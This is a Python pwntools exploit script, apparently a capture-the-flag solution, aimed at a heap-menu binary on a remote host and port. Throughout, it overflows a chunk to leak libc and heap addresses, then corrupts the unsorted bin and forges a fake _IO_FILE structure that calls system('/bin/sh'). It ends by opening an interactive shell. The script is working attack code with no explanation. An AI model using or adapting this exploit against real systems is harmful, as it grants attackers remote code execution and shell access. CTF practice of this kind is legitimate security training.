from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(size):
	cmd(1)
	cmd(size)
def edit(idx,size,c):
	cmd(2)
	cmd(idx)
	cmd(size)
	p.sendafter(":",(c))
def free(idx):
	cmd(3)
	cmd(idx)
def show(idx):
	cmd(4)
	cmd(idx)
context.log_level='debug'
context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#p=process('./pwn')
p=remote("183.129.189.60",10026)
add(0x98)#0
add(0x98)#1
add(0x98)#2
add(0x98)#3
add(0x98)#4
free(1)
edit(0,0x98+0x8,"A"*0xa0)
show(0)
p.readuntil("A"*0xa0)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b78-0x7ffff7a0d000)
edit(0,0x98+0x8,"A"*0x98+p64(0xa1))
log.warning(hex(base))
free(3)
edit(0,0x98+0x8+8,"A"*0xa8)
show(0)
p.readuntil("A"*0xa8)
heap=u64(p.readline()[:-1].ljust(8,'\x00'))#-0x1e0
log.warning(hex(heap))
edit(0,0x98+0x8+8,"A"*0x98+p64(0xa1)+p64(0x7ffff7dd1b78-0x7ffff7a0d000+base))
add(0x98)#1

fio=heap
libc.address=base
fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])
edit(2,0x200,"A"*0x90+fake)
#gdb.attach(p,'')
cmd(1)
cmd(666)
p.interactive('n132>')
